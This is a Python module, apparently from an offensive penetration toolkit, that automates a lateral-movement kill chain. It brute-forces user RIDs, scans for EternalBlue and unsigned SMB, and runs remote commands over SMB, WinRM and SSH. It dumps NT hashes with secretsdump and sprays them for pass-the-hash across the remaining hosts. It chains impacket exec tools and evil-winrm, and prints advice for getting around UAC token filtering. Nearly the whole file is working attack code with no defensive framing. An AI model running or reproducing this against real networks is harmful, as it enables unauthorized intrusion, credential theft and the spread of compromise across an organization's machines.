"""
lateral.py — Lateral movement via CrackMapExec + SSH + impacket
"""

import subprocess, shutil, re, socket
from . import tui, logger


# ── recon helpers ─────────────────────────────────────────────────────────────

def rid_brute(ip: str, user: str = "", password: str = "") -> list[str]:
    exe = shutil.which("crackmapexec") or shutil.which("cme")
    if not exe:
        return []
    try:
        r = subprocess.run(
            [exe, "smb", ip, "-u", user, "-p", password,
             "--local-auth", "--rid-brute"],
            capture_output=True, text=True, timeout=30
        )
        logger.subprocess_output("cme --rid-brute", [exe, ip], r.returncode, r.stdout + r.stderr)
    except Exception as e:
        logger.warn(f"rid_brute failed on {ip}: {e}")
        return []
    users = []
    for line in r.stdout.splitlines():
        m = re.search(r"\d+: \S+\\(\S+)\s+\(SidTypeUser\)", line)
        if m:
            name = m.group(1)
            if name not in ("DefaultAccount", "WDAGUtilityAccount", "Invitado", "Guest"):
                users.append(name)
    return users


def check_vulns(ip: str) -> dict:
    if not shutil.which("nmap"):
        return {}
    scripts = "smb-vuln-ms17-010,smb2-security-mode"
    try:
        r = subprocess.run(
            ["nmap", "--script", scripts, "-p", "445", "-T4", ip],
            capture_output=True, text=True, timeout=60
        )
        out = r.stdout
        logger.subprocess_output("nmap vuln", ["nmap", ip], r.returncode, out)
    except Exception as e:
        logger.warn(f"nmap vuln scan failed on {ip}: {e}")
        return {}
    return {
        "ms17-010":         "VULNERABLE" in out and "ms17-010" in out.lower(),
        "signing_disabled": "Message signing enabled but not required" in out,
    }


def _cme(hosts: list[str], user: str, password: str,
         protocol="smb", command: str = None) -> list[dict]:
    exe = shutil.which("crackmapexec") or shutil.which("cme")
    if not exe:
        tui.error("CrackMapExec not found — install: sudo apt install crackmapexec")
        return []

    results = []
    for ip in hosts:
        cmd = [exe, protocol, ip, "-u", user, "-p", password]
        if command:
            cmd += ["-x", command]
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            out = r.stdout + r.stderr
            logger.subprocess_output(f"cme {protocol}", cmd, r.returncode, out)
        except subprocess.TimeoutExpired:
            tui.warn(f"  CME timed out on {ip}")
            logger.warn(f"CME timeout: {ip}")
            out = ""
        except Exception as e:
            tui.warn(f"  CME failed on {ip}: {e}")
            logger.error(f"CME exception {ip}: {e}")
            out = ""

        pwned  = "[+]" in out or "Pwn3d!" in out
        results.append({"ip": ip, "output": out.strip(), "pwned": pwned})
        status = f"{tui.GRN}PWNED{tui.R}" if pwned else f"{tui.DIM}no{tui.R}"
        tui.info(f"  {ip:<16}  {status}")

    return results


def smb_exec(hosts, user, password, command="whoami"):
    tui.info(f"SMB exec on {len(hosts)} host(s) as {user} ...")
    return _cme(hosts, user, password, protocol="smb", command=command)


def winrm_exec(hosts, user, password, command="whoami"):
    tui.info(f"WinRM exec on {len(hosts)} host(s) as {user} ...")
    return _cme(hosts, user, password, protocol="winrm", command=command)


def ssh_exec(ip: str, user: str, password: str, command: str = "id && hostname") -> str:
    try:
        import paramiko
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect(ip, username=user, password=password,
                  timeout=10, allow_agent=False, look_for_keys=False)
        _, stdout, stderr = c.exec_command(command)
        out = stdout.read().decode().strip()
        err = stderr.read().decode().strip()
        c.close()
        logger.subprocess_output("ssh_exec", [user, ip, command], 0, out or err)
        return out
    except ImportError:
        tui.error("paramiko not installed — pip3 install paramiko")
        return ""
    except Exception as e:
        tui.warn(f"SSH exec failed on {ip}: {e}")
        logger.warn(f"SSH exec failed {ip} as {user}: {e}")
        return ""


# ── post-exploitation ─────────────────────────────────────────────────────────

def dump_secrets(ip: str, user: str, password: str) -> list[str]:
    """
    Run impacket-secretsdump. Parses NT hashes, saves to vault.
    Returns list of raw hash lines (username:RID:LM:NT:::).
    NT hashes can be used for pass-the-hash on other machines without cracking.
    """
    from . import vault as _vault

    exe = shutil.which("impacket-secretsdump") or shutil.which("secretsdump.py")
    if not exe:
        tui.warn("impacket-secretsdump not found — install: sudo apt install python3-impacket")
        return []

    tui.info(f"  Running secretsdump on {ip} ...")
    try:
        r = subprocess.run(
            [exe, f"{user}:{password}@{ip}"],
            capture_output=True, text=True, timeout=60
        )
        out = r.stdout + r.stderr
        logger.subprocess_output("secretsdump", [exe, f"{user}@{ip}"], r.returncode, out)
    except subprocess.TimeoutExpired:
        tui.warn(f"  secretsdump timed out on {ip} — see log: {logger.path()}")
        logger.warn(f"secretsdump timeout: {ip}")
        return []
    except Exception as e:
        tui.error(f"  secretsdump failed: {e}")
        logger.error(f"secretsdump exception {ip}: {e}")
        return []

    if r.returncode != 0 and not r.stdout.strip():
        tui.warn(f"  secretsdump returned nothing on {ip} — see log: {logger.path()}")
        return []

    empty_lm = "aad3b435b51404eeaad3b435b51404ee"
    nt_hashes = []
    for line in out.splitlines():
        m = re.match(r"^(\S+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::", line)
        if m:
            uname, rid, lm, nt = m.group(1), m.group(2), m.group(3), m.group(4)
            if nt == empty_lm:
                continue
            nt_hashes.append(line.strip())
            tui.success(f"  NT hash: {tui.YLW}{uname}{tui.R}  {tui.DIM}{nt}{tui.R}")
            _vault.add_hash(ip, uname, ip, nt, hash_type="NTLM")

    if nt_hashes:
        tui.success(
            f"  Dumped {len(nt_hashes)} NT hash(es) from {ip} — saved to vault.\n"
            f"  Crack them on the GPU machine, or use pass-the-hash below."
        )
        logger.success(f"secretsdump {ip}: {len(nt_hashes)} NT hashes")
    else:
        tui.warn(f"  No NT hashes from {ip} — target may have restricted SAM access")
        logger.warn(f"secretsdump no hashes: {ip}")

    return nt_hashes


def pth_spray(hosts: list[str], user: str, nt_hash: str) -> list[str]:
    """
    Pass-the-hash: authenticate using NT hash directly (no password needed).
    Works on any account — including domain accounts — that matches the hash.
    Returns IPs where PTH succeeded.
    """
    exe = shutil.which("crackmapexec") or shutil.which("cme")
    if not exe:
        return []

    tui.info(f"  Pass-the-hash: {user} against {len(hosts)} host(s) ...")
    pwned = []
    for ip in hosts:
        cmd = [exe, "smb", ip, "-u", user, "-H", nt_hash, "--local-auth"]
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
            out = r.stdout + r.stderr
            logger.subprocess_output("cme pth", cmd, r.returncode, out)
            if "Pwn3d!" in out or "[+]" in out:
                tui.success(f"  PTH hit: {tui.YLW}{user}{tui.R} → {tui.WH}{ip}{tui.R}")
                logger.success(f"PTH success: {user} → {ip}")
                pwned.append(ip)
        except Exception as e:
            logger.warn(f"PTH exception {ip}: {e}")

    return pwned


# ── shell attempts ─────────────────────────────────────────────────────────────

_UAC_FILTER_MARKERS = (
    "Authenticated as Guest",
    "rpc_s_access_denied",
    "Unknown DCE RPC fault status code: 00000721",
)


def _port_open(ip: str, port: int, timeout: float = 2.0) -> bool:
    try:
        s = socket.create_connection((ip, port), timeout=timeout)
        s.close()
        return True
    except Exception:
        return False


def get_shell(ip: str, user: str, password: str) -> bool:
    """
    Try impacket exec chain, then evil-winrm if UAC blocks everything.
    On any success, auto-runs secretsdump to dump credentials.
    """
    methods = [
        ("impacket-psexec",   ["-service-name", "CASCADE"]),
        ("impacket-wmiexec",  []),
        ("impacket-smbexec",  []),
        ("impacket-atexec",   []),
    ]
    uac_blocked = False

    for exe_name, extra_args in methods:
        exe = shutil.which(exe_name)
        if not exe:
            continue
        tui.info(f"  Trying {exe_name} ...")
        try:
            r = subprocess.run(
                [exe] + extra_args + [f"{user}:{password}@{ip}", "whoami"],
                capture_output=True, text=True, timeout=30
            )
            out = r.stdout + r.stderr
            logger.subprocess_output(exe_name, [exe, ip], r.returncode, out)

            if any(m in out for m in _UAC_FILTER_MARKERS):
                uac_blocked = True
                logger.warn(f"UAC blocked {exe_name} on {ip}")
                continue
            if r.returncode == 0 and out.strip():
                tui.success(f"Shell via {exe_name}: {out.strip()[:80]}")
                logger.success(f"Shell: {exe_name} on {ip} as {user}")
                dump_secrets(ip, user, password)
                return True
        except subprocess.TimeoutExpired:
            tui.warn(f"  {exe_name} timed out on {ip}")
            logger.warn(f"{exe_name} timeout: {ip}")
        except Exception as e:
            logger.warn(f"{exe_name} exception {ip}: {e}")

    # evil-winrm — separate auth path, not affected by UAC filter
    if _port_open(ip, 5985):
        ewrm = shutil.which("evil-winrm")
        if ewrm:
            tui.info("  WinRM port open — trying evil-winrm (bypasses UAC filter) ...")
            try:
                r = subprocess.run(
                    [ewrm, "-i", ip, "-u", user, "-p", password],
                    capture_output=True, text=True, timeout=20
                )
                out = r.stdout + r.stderr
                logger.subprocess_output("evil-winrm", [ewrm, ip], r.returncode, out)
                if "PS " in out or "Windows PowerShell" in out:
                    tui.success(f"WinRM shell via evil-winrm on {ip}")
                    logger.success(f"evil-winrm shell: {ip} as {user}")
                    dump_secrets(ip, user, password)
                    return True
            except Exception as e:
                logger.warn(f"evil-winrm exception {ip}: {e}")
        else:
            tui.warn(
                f"  WinRM is open on {ip} but evil-winrm not installed.\n"
                f"  Install: sudo gem install evil-winrm"
            )

    if uac_blocked:
        tui.warn(
            f"  {ip}: UAC token filter blocked all exec methods.\n"
            f"  Options:\n"
            f"    1. Enable WinRM on target (port 5985) — evil-winrm bypasses this\n"
            f"    2. Use NTLM relay (harvest → relay mode)\n"
            f"    3. If MS17-010 present — run the Exploit stage for SYSTEM shell\n"
            f"    4. Find built-in Administrator account (RID 500)"
        )

    return False


# ── kill chain ─────────────────────────────────────────────────────────────────

def run_kill_chain(hosts: list[dict], creds: list[dict]) -> list[dict]:
    if not creds:
        tui.warn("No credentials — cannot attempt lateral movement.")
        return []

    results   = []
    smb_hosts = [h["ip"] for h in hosts if 445 in (h.get("ports") or [])]
    ssh_hosts = [h["ip"] for h in hosts if 22  in (h.get("ports") or [])]

    first_cred = creds[0]
    first_user = first_cred.get("user", "")
    first_pwd  = first_cred.get("secret", "") or first_cred.get("password", "")

    for ip in smb_hosts:
        tui.phase(f"RECON — {ip}")
        vulns = check_vulns(ip)
        if vulns.get("ms17-010"):
            tui.warn(f"  {ip} — VULNERABLE to EternalBlue → run Exploit stage [7]")
        if vulns.get("signing_disabled"):
            tui.info(f"  {ip} — SMB signing disabled, relay attacks possible")

        extra_users = rid_brute(ip, first_user, first_pwd)
        if extra_users:
            tui.info(f"  Found accounts: {', '.join(extra_users)}")
            for u in extra_users:
                if u not in [c.get("user") for c in creds]:
                    for c in list(creds):
                        creds.append({"user": u, "secret": c.get("secret", ""),
                                      "service": c.get("service", "smb"), "target": ip})

    for c in creds:
        user = c.get("user", "")
        pwd  = c.get("secret", "") or c.get("password", "")

        if smb_hosts:
            tui.phase(f"SMB LATERAL — {user}")
            r = smb_exec(smb_hosts, user, pwd)
            for x in r:
                if x["pwned"]:
                    results.append(x)
                    # Auto secretsdump + PTH spray from dumped hashes
                    nt = dump_secrets(x["ip"], user, pwd)
                    if nt:
                        other = [h for h in smb_hosts if h != x["ip"]]
                        if other:
                            tui.info("  Spraying dumped NT hashes across remaining hosts ...")
                            for hash_line in nt:
                                parts = hash_line.split(":")
                                if len(parts) >= 4:
                                    pth_user = parts[0]
                                    nt_hash  = parts[3]
                                    hit_ips  = pth_spray(other, pth_user, nt_hash)
                                    for hip in hit_ips:
                                        results.append({"ip": hip, "user": pth_user,
                                                        "pwned": True, "method": "pth"})
                elif "Guest" in x.get("output", "") or "access_denied" in x.get("output","").lower():
                    tui.warn(f"  {x['ip']}: CME as Guest — trying full exec chain ...")
                    if get_shell(x["ip"], user, pwd):
                        results.append({**x, "pwned": True})

        for ip in ssh_hosts:
            tui.phase(f"SSH LATERAL — {user}@{ip}")
            out = ssh_exec(ip, user, pwd)
            if out:
                tui.success(f"Shell on {ip}:\n{tui.DIM}{out}{tui.R}")
                results.append({"ip": ip, "service": "ssh", "user": user,
                                "output": out, "pwned": True})

    return results
